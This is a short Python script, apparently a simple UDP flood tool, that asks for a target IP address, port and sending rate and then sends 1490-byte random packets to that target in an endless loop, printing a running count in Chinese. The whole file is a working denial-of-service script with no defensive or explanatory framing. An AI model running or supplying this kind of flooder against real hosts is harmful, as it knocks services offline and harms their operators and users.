import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

try:
     ip = input("IP:")
     port = int(input("PORT: "))
     sd = int(input("velocity(1~1000):"))
except Exception as e:
     print(e)
     print('stop')
     pass

sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     print ("已发送数据包 %s 个到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)